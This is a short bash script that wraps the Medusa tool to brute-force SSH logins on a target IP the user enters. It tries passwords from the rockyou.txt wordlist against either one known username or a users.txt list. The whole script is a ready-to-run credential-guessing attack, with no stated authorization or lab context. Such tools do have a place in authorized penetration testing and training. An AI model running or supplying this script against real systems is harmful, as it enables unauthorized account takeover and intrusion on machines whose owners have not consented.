#!/bin/bash
#Use Medusa to find the passwords

file="users.txt"
echo "Enter target ip:"
read ip

#Create an if condition, if I know the user I type, if I dont know I use an users list
read -r -p "Do you know the user ? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
then
echo "Enter target username:"
read username
medusa -h $ip -u $username -P rockyou.txt -M ssh
else
medusa -h $ip -U $file -P rockyou.txt -M ssh
fi
